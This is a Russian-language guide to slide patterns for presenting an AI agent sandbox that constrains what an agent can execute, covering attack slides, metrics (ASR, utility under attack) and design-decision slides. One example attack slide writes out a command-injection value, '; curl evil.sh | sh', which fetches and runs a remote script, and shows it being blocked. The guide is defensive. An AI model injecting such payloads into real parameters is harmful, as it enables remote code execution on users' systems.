# Паттерны слайдов

## Общий принцип

Слайд про безопасность убеждает **механизмом**, а не прилагательным.
«Надёжно защищено» — ноль информации. «Строки команды не существует, инжектить некуда» —
проверяемое утверждение.

## Паттерн: слайд атаки

Четыре блока, всегда в одном порядке:

```
ЗАГОЛОВОК       Инъекция в параметр
ВХОД            pattern: "; curl evil.sh | sh"
ЧТО ПРОИЗОШЛО   ⛔ validate — не соответствует ^[\w./-]{0,64}$
                   вызов не дошёл до spawn
ПОЧЕМУ          Даже если бы regex пропустил — строка попала бы
                ОДНИМ элементом argv, а не в shell. Две независимые причины отказа.
ОГОВОРКА        Regex пишет автор манифеста. Слабый regex — слабая первая линия.
```

Блок «Оговорка» никогда не выбрасывается ради красоты.

## Паттерн: слайд сравнения

Матрица с тремя колонками, не двумя. Третья — категория решений, а не только
ближайший конкурент. Строки, где у нас ✅, а у всех ❌, идут вниз, а не вверх:
сначала показываем, что мы честно повторяем, потом — чем отличаемся.

Никаких ✅ у себя там, где реализации ещё нет. Планируемое помечается отдельно.

## Паттерн: слайд метрик

Всегда пара, никогда одна цифра:

```
ASR                    0.0%     ← атаки заблокированы
Utility under Attack  97.6%     ← и при этом работа не сломана
Baseline (none)       34.4%     ← без песочницы прошло бы 31 из 90
```

Без baseline цифра ASR не интерпретируема. Без Utility цифра ASR не является результатом:
`chmod 000` даёт ASR = 0.

Пока прогона не было — прочерк и подпись «целевое», не выдуманное число.

## Паттерн: слайд решения (ADR)

```
РЕШЕНИЕ      Песочница через @anthropic-ai/sandbox-runtime
ВМЕСТО       Своих SBPL-профилей
ПОЧЕМУ       Готовы: seatbelt-профили, прокси для доменной фильтрации,
             mandatory deny paths, структурированный поток нарушений
ЦЕНА         Наследуем ограничения: домены вместо содержимого, domain fronting
```

Блок «Цена» обязателен. Решение без цены выглядит как реклама.

## Паттерн: титульный слайд

Одна фраза, описывающая механизм, а не пользу:

> Модель говорит **что** сделать. Прокси решает **чем** это сделать.
> ОС решает **что запущенное может**. Человек видит всё три.

Не «безопасный AI-агент нового поколения».

## Паттерн: финальный слайд

Из `10-honest-limitations.md`, дословно:

> Мы не решаем prompt injection. Мы сводим поверхность к нулю там, где раньше был shell,
> и делаем всё остальное видимым.
>
> Мы не делаем атаку невозможной. Мы поднимаем её стоимость и гарантируем,
> что она оставит след.

## Визуальные соглашения

| Символ | Значение | Где |
|---|---|---|
| ● ◐ ○ | покрываем / частично / вне scope | карта OWASP |
| 🟢 🔴 | разрешено / заблокировано | таймлайн, таблицы режимов |
| ⛔ | остановка на стадии | слайды атак |
| ✅ ❌ | есть / нет возможности | матрицы сравнения |
| ⚠️ | цена решения, оговорка | ADR, границы |

Цвет не должен быть единственным носителем смысла — рядом всегда слово или символ.

## Чего избегать

- Слайдов «наши преимущества» без механизма
- Списков фич без указания, что реализовано, а что запланировано
- Диаграмм архитектуры, нарисованных заново под каждый дек — топология каноническая
- Цифр без источника
- Сглаживания формулировок из документации в сторону силы
